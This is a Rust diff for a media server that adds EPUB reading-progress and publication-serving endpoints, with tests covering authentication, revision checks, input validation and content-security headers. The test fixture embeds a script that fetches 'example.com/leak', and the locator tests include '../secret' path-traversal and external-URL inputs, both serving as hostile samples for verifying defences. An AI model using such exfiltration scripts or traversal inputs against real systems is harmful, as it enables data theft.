@@ -23,6 +23,8 @@ mod offline;
 mod pgs_overlay;
 mod photos;
 mod plex;
+pub(crate) mod publication;
+mod reading;
 mod scan;
 pub(crate) mod stream;
 pub(crate) mod system;
@@ -50,6 +52,7 @@ mod users;
 mod watch;
 mod web;
 
+use axum::extract::DefaultBodyLimit;
 use axum::extract::State;
 use axum::http::{Request, StatusCode, Uri};
 use axum::response::IntoResponse;
@@ -153,6 +156,13 @@ pub fn router(state: AppState) -> Router {
         .route("/items/{id}/progress", post(watch::progress))
         .route("/items/{id}/scrobble", post(watch::scrobble))
         .route("/items/{id}/unscrobble", post(watch::unscrobble))
+        .route(
+            "/items/{id}/reading-state",
+            get(reading::get_state)
+                .put(reading::put_state)
+                .delete(reading::delete_state)
+                .layer(DefaultBodyLimit::max(64 * 1024)),
+        )
         // Playback
         .route("/files/{id}/decision", get(stream::decision))
         .route("/files/{id}/audio-offset", put(stream::set_audio_offset))
@@ -178,6 +188,12 @@ pub fn router(state: AppState) -> Router {
         .route("/offline/media/{token}/{segment}", get(offline::segment))
         .route("/files/{id}/direct", get(stream::direct))
         .route("/files/{id}/content", get(stream::book_content))
+        .route("/files/{id}/publication", post(publication::open))
+        .route("/publication/{session}", delete(publication::close))
+        .route(
+            "/publication/{session}/{*resource}",
+            get(publication::resource),
+        )
         .route("/files/{id}/stream.mp4", get(stream::stream_mp4))
         .route(
             "/files/{id}/subs/{index}/overlay.json",
@@ -280,11 +296,12 @@ pub fn router(state: AppState) -> Router {
 
 fn safe_trace_target(uri: &Uri) -> String {
     let mut segments = uri.path().split('/').collect::<Vec<_>>();
-    for marker in ["media", "hls"] {
+    for marker in ["media", "hls", "publication"] {
         if let Some(index) = segments.iter().position(|segment| *segment == marker) {
             let is_capability_route = match marker {
                 "media" => index >= 2 && segments.get(index.wrapping_sub(1)) == Some(&"offline"),
                 "hls" => true,
+                "publication" => true,
                 _ => false,
             };
             if is_capability_route && index + 1 < segments.len() {
@@ -331,6 +348,7 @@ async fn readyz(State(state): State<AppState>) -> impl IntoResponse {
 
 #[cfg(test)]
 mod tests {
+    use std::io::Write;
     use std::sync::Arc;
 
     use axum::body::Body;
@@ -339,6 +357,8 @@ mod tests {
     use plurx_core::store::SqliteStore;
     use serde_json::{json, Value};
     use tower::ServiceExt;
+    use zip::write::SimpleFileOptions;
+    use zip::{CompressionMethod, ZipWriter};
 
     use super::*;
 
@@ -363,6 +383,14 @@ mod tests {
         assert_eq!(
             safe_trace_target(&hls),
             "/api/v1/hls/[REDACTED]/seg00001.ts"
+        );
+
+        let publication: Uri = "/api/v1/publication/session-secret/OEBPS/chapter.xhtml"
+            .parse()
+            .expect("uri");
+        assert_eq!(
+            safe_trace_target(&publication),
+            "/api/v1/publication/[REDACTED]/OEBPS/chapter.xhtml"
         );
     }
 
@@ -2491,7 +2519,7 @@ mod tests {
                     "node_id": "joining-node",
                     "raft_address": "127.0.0.1:32411",
                     "api_address": "127.0.0.1:32412",
-                    "schema_version": 5,
+                    "schema_version": 6,
                     "protocol_version": 4
                 }),
             ),
@@ -3046,6 +3074,511 @@ mod tests {
         );
         state.pgs_overlay_enabled = true;
         (router(state.clone()), state)
+    }
+
+    #[tokio::test]
+    async fn reading_state_api_is_authenticated_revision_bound_and_ordered() {
+        use plurx_core::domain::{ItemKind, LibraryKind, NewItem, NewLibrary, ProbeResult};
+
+        let (app, state) = test_state();
+        let admin = setup_admin(&app).await;
+        let library = state
+            .store
+            .create_library(&NewLibrary {
+                name: "Reading API Books".into(),
+                kind: LibraryKind::Books,
+                paths: vec![std::path::PathBuf::from("/reading-api")],
+                anime: false,
+            })
+            .await
+            .expect("books library");
+        let book = state
+            .store
+            .insert_item(&NewItem {
+                library_id: library.id,
+                kind: ItemKind::Book,
+                parent_id: None,
+                title: "Reading API Contract".into(),
+                year: Some(2026),
+                season_number: None,
+                episode_number: None,
+            })
+            .await
+            .expect("book");
+        let file = state
+            .store
+            .upsert_file(
+                book,
+                "/reading-api/contract.epub",
+                4_096,
+                100,
+                &ProbeResult::default(),
+            )
+            .await
+            .expect("book file");
+
+        let uri = format!("/api/v1/items/{book}/reading-state?file_id={file}");
+        assert_eq!(
+            call(&app, get(&uri, None)).await.0,
+            StatusCode::UNAUTHORIZED
+        );
+        let (status, empty) = call(&app, get(&uri, Some(&admin))).await;
+        assert_eq!(status, StatusCode::OK, "{empty}");
+        assert!(empty["state"].is_null());
+        assert_eq!(empty["stale"], false);
+
+        let put_uri = format!("/api/v1/items/{book}/reading-state");
+        let (status, saved) = call(
+            &app,
+            put(
+                &put_uri,
+                Some(&admin),
+                json!({
+                    "file_id": file,
+                    "revision": { "size": 4096, "mtime": 100 },
+                    "locator": {
+                        "version": 1,
+                        "href": "Text/chapter-3.xhtml#paragraph-2",
+                        "locations": { "progression": 0.6, "totalProgression": 0.6 }
+                    },
+                    "progression": 0.6,
+                    "completed": false,
+                    "recorded_at": 200
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK, "{saved}");
+        assert_eq!(saved["file_id"], file);
+        assert_eq!(saved["revision"], json!({ "size": 4096, "mtime": 100 }));
+        assert_eq!(saved["progression"], 0.6);
+
+        // An older offline close event returns the durable winner; it cannot
+        // rewind the state saved by a newer device.
+        let (status, winner) = call(
+            &app,
+            put(
+                &put_uri,
+                Some(&admin),
+                json!({
+                    "file_id": file,
+                    "revision": { "size": 4096, "mtime": 100 },
+                    "locator": { "version": 1, "href": "Text/chapter-1.xhtml" },
+                    "progression": 0.1,
+                    "completed": false,
+                    "recorded_at": 100
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK, "{winner}");
+        assert_eq!(winner["progression"], 0.6);
+        assert_eq!(
+            winner["locator"]["href"],
+            "Text/chapter-3.xhtml#paragraph-2"
+        );
+
+        let (status, detail) =
+            call(&app, get(&format!("/api/v1/items/{book}"), Some(&admin))).await;
+        assert_eq!(status, StatusCode::OK, "{detail}");
+        assert_eq!(detail["reading"]["progression"], 0.6);
+
+        let (status, conflict) = call(
+            &app,
+            put(
+                &put_uri,
+                Some(&admin),
+                json!({
+                    "file_id": file,
+                    "revision": { "size": 4097, "mtime": 100 },
+                    "locator": { "version": 1, "href": "chapter.xhtml" },
+                    "progression": 0.7,
+                    "completed": false
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::CONFLICT, "{conflict}");
+
+        let same_file = state
+            .store
+            .upsert_file(
+                book,
+                "/reading-api/contract.epub",
+                4_100,
+                101,
+                &ProbeResult::default(),
+            )
+            .await
+            .expect("replace revision");
+        assert_eq!(same_file, file);
+        let (status, stale) = call(&app, get(&uri, Some(&admin))).await;
+        assert_eq!(status, StatusCode::OK, "{stale}");
+        assert_eq!(stale["stale"], true);
+        assert!(stale["state"].is_null(), "{stale}");
+        let (_, detail) = call(&app, get(&format!("/api/v1/items/{book}"), Some(&admin))).await;
+        assert!(detail["reading"].is_null(), "{detail}");
+
+        let (status, current) = call(
+            &app,
+            put(
+                &put_uri,
+                Some(&admin),
+                json!({
+                    "file_id": file,
+                    "revision": { "size": 4100, "mtime": 101 },
+                    "locator": { "version": 1, "href": "Text/chapter-4.xhtml" },
+                    "progression": 1.0,
+                    "completed": true,
+                    "recorded_at": 50
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK, "{current}");
+        assert_eq!(current["completed"], true);
+        assert_eq!(current["updated_at"], 50);
+
+        assert_eq!(
+            call(&app, delete(&uri, Some(&admin))).await.0,
+            StatusCode::NO_CONTENT
+        );
+        assert_eq!(
+            call(&app, delete(&uri, Some(&admin))).await.0,
+            StatusCode::NO_CONTENT,
+            "deletion is idempotent"
+        );
+        assert!(call(&app, get(&uri, Some(&admin))).await.1["state"].is_null());
+    }
+
+    #[tokio::test]
+    async fn reading_state_api_rejects_non_books_invalid_locators_and_large_bodies() {
+        use plurx_core::domain::{ItemKind, LibraryKind, NewItem, NewLibrary, ProbeResult};
+
+        let (app, state) = test_state();
+        let admin = setup_admin(&app).await;
+        let library = state
+            .store
+            .create_library(&NewLibrary {
+                name: "Reading Validation Books".into(),
+                kind: LibraryKind::Books,
+                paths: vec![std::path::PathBuf::from("/reading-validation")],
+                anime: false,
+            })
+            .await
+            .expect("books library");
+        let mut items = Vec::new();
+        for (kind, name, extension) in [
+            (ItemKind::Book, "Text", "epub"),
+            (ItemKind::Audiobook, "Audio", "m4b"),
+        ] {
+            let item = state
+                .store
+                .insert_item(&NewItem {
+                    library_id: library.id,
+                    kind,
+                    parent_id: None,
+                    title: name.into(),
+                    year: None,
+                    season_number: None,
+                    episode_number: None,
+                })
+                .await
+                .expect("item");
+            let file = state
+                .store
+                .upsert_file(
+                    item,
+                    &format!("/reading-validation/{name}.{extension}"),
+                    100,
+                    10,
+                    &ProbeResult::default(),
+                )
+                .await
+                .expect("file");
+            items.push((item, file));
+        }
+        let (book, book_file) = items[0];
+        let (audio, audio_file) = items[1];
+        let payload = |locator: Value, progression: f64| {
+            json!({
+                "file_id": book_file,
+                "revision": { "size": 100, "mtime": 10 },
+                "locator": locator,
+                "progression": progression,
+                "completed": false
+            })
+        };
+
+        for locator in [
+            json!({ "version": 2, "href": "chapter.xhtml" }),
+            json!({ "version": 1, "href": "../secret" }),
+            json!({ "version": 1, "href": "https://example.com/chapter" }),
+            json!({
+                "version": 1,
+                "href": "chapter.xhtml",
+                "locations": { "progression": 1.1 }
+            }),
+        ] {
+            let (status, body) = call(
+                &app,
+                put(
+                    &format!("/api/v1/items/{book}/reading-state"),
+                    Some(&admin),
+                    payload(locator, 0.5),
+                ),
+            )
+            .await;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+        }
+        assert_eq!(
+            call(
+                &app,
+                put(
+                    &format!("/api/v1/items/{book}/reading-state"),
+                    Some(&admin),
+                    payload(json!({ "version": 1, "href": "chapter.xhtml" }), 1.1),
+                ),
+            )
+            .await
+            .0,
+            StatusCode::BAD_REQUEST
+        );
+
+        let (status, body) = call(
+            &app,
+            put(
+                &format!("/api/v1/items/{audio}/reading-state"),
+                Some(&admin),
+                json!({
+                    "file_id": audio_file,
+                    "revision": { "size": 100, "mtime": 10 },
+                    "locator": { "version": 1, "href": "chapter.xhtml" },
+                    "progression": 0.5,
+                    "completed": false
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
+
+        let oversized = "x".repeat(70 * 1024);
+        let (status, _) = call(
+            &app,
+            put(
+                &format!("/api/v1/items/{book}/reading-state"),
+                Some(&admin),
+                payload(json!({ "version": 1, "href": oversized }), 0.5),
+            ),
+        )
+        .await;
+        assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
+    }
+
+    fn write_epub_fixture(path: &std::path::Path) {
+        let file = std::fs::File::create(path).expect("EPUB fixture file");
+        let mut writer = ZipWriter::new(file);
+        let options = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
+        for (name, body) in [
+            ("mimetype", "application/epub+zip"),
+            (
+                "META-INF/container.xml",
+                r#"<container><rootfiles><rootfile full-path="OEBPS/book.opf"/></rootfiles></container>"#,
+            ),
+            (
+                "OEBPS/book.opf",
+                r#"<package><metadata><title>HTTP Proof</title></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="chapter" href="Text/chapter.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="chapter"/></spine></package>"#,
+            ),
+            (
+                "OEBPS/nav.xhtml",
+                r#"<html xmlns:epub="http://www.idpf.org/2007/ops"><body><nav epub:type="toc"><ol><li><a href="Text/chapter.xhtml">Chapter</a></li></ol></nav></body></html>"#,
+            ),
+            (
+                "OEBPS/Text/chapter.xhtml",
+                r#"<html><body><script>fetch('https://example.com/leak')</script><h1>Chapter</h1></body></html>"#,
+            ),
+        ] {
+            writer
+                .start_file(name, options)
+                .expect("EPUB fixture entry");
+            writer
+                .write_all(body.as_bytes())
+                .expect("EPUB fixture bytes");
+        }
+        writer.finish().expect("finish EPUB fixture");
+    }
+
+    #[tokio::test]
+    async fn publication_api_is_authenticated_scoped_and_script_network_closed() {
+        use plurx_core::domain::{ItemKind, LibraryKind, NewItem, NewLibrary, ProbeResult};
+
+        let directory = tempfile::tempdir().expect("publication directory");
+        let path = directory.path().join("proof.epub");
+        write_epub_fixture(&path);
+        let metadata = std::fs::metadata(&path).expect("EPUB metadata");
+        let size = i64::try_from(metadata.len()).expect("fixture size");
+        let mtime = metadata
+            .modified()
+            .expect("fixture mtime")
+            .duration_since(std::time::UNIX_EPOCH)
+            .expect("fixture after epoch")
+            .as_secs() as i64;
+
+        let (app, state) = test_state();
+        let admin = setup_admin(&app).await;
+        let library = state
+            .store
+            .create_library(&NewLibrary {
+                name: "Publication API Books".into(),
+                kind: LibraryKind::Books,
+                paths: vec![directory.path().to_path_buf()],
+                anime: false,
+            })
+            .await
+            .expect("books library");
+        let item = state
+            .store
+            .insert_item(&NewItem {
+                library_id: library.id,
+                kind: ItemKind::Book,
+                parent_id: None,
+                title: "HTTP Proof".into(),
+                year: None,
+                season_number: None,
+                episode_number: None,
+            })
+            .await
+            .expect("book");
+        let file = state
+            .store
+            .upsert_file(
+                item,
+                &path.to_string_lossy(),
+                size,
+                mtime,
+                &ProbeResult::default(),
+            )
+            .await
+            .expect("book file");
+        let open_uri = format!("/api/v1/files/{file}/publication");
+        assert_eq!(
+            call(&app, post(&open_uri, None, json!({}))).await.0,
+            StatusCode::UNAUTHORIZED
+        );
+        let (status, opened) = call(&app, post(&open_uri, Some(&admin), json!({}))).await;
+        assert_eq!(status, StatusCode::OK, "{opened}");
+        assert_eq!(opened["publication"]["metadata"]["title"], "HTTP Proof");
+        assert_eq!(opened["publication"]["toc"][0]["title"], "Chapter");
+        assert_eq!(opened["limits"]["entries"], 20_000);
+        assert_eq!(opened["limits"]["concurrent_resource_reads"], 8);
+        assert_eq!(opened["limits"]["resource_chunk_bytes"], 65_536);
+
+        let resource_uri = format!(
+            "{}OEBPS/Text/chapter.xhtml",
+            opened["resource_base"].as_str().expect("resource base")
+        );
+        let response = app
+            .clone()
+            .oneshot(get(&resource_uri, None))
+            .await
+            .expect("publication resource");
+        assert_eq!(response.status(), StatusCode::OK);
+        let csp = response
+            .headers()
+            .get("content-security-policy")
+            .and_then(|value| value.to_str().ok())
+            .expect("resource CSP");
+        assert!(csp.contains("script-src 'none'"), "{csp}");
+        assert!(csp.contains("connect-src 'none'"), "{csp}");
+        assert!(csp.contains("img-src 'self' data:"), "{csp}");
+        assert!(response.headers().get("content-length").is_some());
+        assert!(response.headers().get("referrer-policy").is_some());
+        let resource_body = response
+            .into_body()
+            .collect()
+            .await
+            .expect("streamed publication body")
+            .to_bytes();
+        assert!(
+            resource_body
+                .windows(b"<h1>Chapter</h1>".len())
+                .any(|window| window == b"<h1>Chapter</h1>"),
+            "the decompressed resource must reach the HTTP body"
+        );
+
+        call(
+            &app,
+            post(
+                "/api/v1/users",
+                Some(&admin),
+                json!({ "username": "reader", "password": "longenough" }),
+            ),
+        )
+        .await;
+        let (_, login) = call(
+            &app,
+            post(
+                "/api/v1/auth/login",
+                None,
+                json!({ "username": "reader", "password": "longenough" }),
+            ),
+        )
+        .await;
+        let reader = login["token"].as_str().expect("reader token").to_owned();
+        let session = opened["session_id"].as_str().expect("session id");
+        assert_eq!(
+            call(
+                &app,
+                delete_req(&format!("/api/v1/publication/{session}"), Some(&reader),),
+            )
+            .await
+            .0,
+            StatusCode::NOT_FOUND,
+            "a different user must not discover or revoke the capability"
+        );
+        assert_eq!(
+            app.clone()
+                .oneshot(get(&resource_uri, None))
+                .await
+                .expect("publication resource after foreign close")
+                .status(),
+            StatusCode::OK
+        );
+
+        // A capability is bound to the exact bytes that were parsed. Even a
+        // still-valid session must not blend a new ZIP revision with the old
+        // manifest.
+        std::fs::OpenOptions::new()
+            .append(true)
+            .open(&path)
+            .expect("reopen EPUB")
+            .write_all(b"changed")
+            .expect("replace EPUB revision");
+        assert_eq!(
+            app.clone()
+                .oneshot(get(&resource_uri, None))
+                .await
+                .expect("changed resource")
+                .status(),
+            StatusCode::CONFLICT
+        );
+
+        assert_eq!(
+            call(
+                &app,
+                delete_req(&format!("/api/v1/publication/{session}"), Some(&admin)),
+            )
+            .await
+            .0,
+            StatusCode::NO_CONTENT
+        );
+        assert_eq!(
+            app.oneshot(get(&resource_uri, None))
+                .await
+                .expect("closed resource")
+                .status(),
+            StatusCode::NOT_FOUND
+        );
     }
 
     #[tokio::test]
@@ -5828,6 +6361,7 @@ mod tests {
                 "/files/0/probed",
                 "/children",
                 "/ancestors",
+                "/reading",
             ],
         );
 
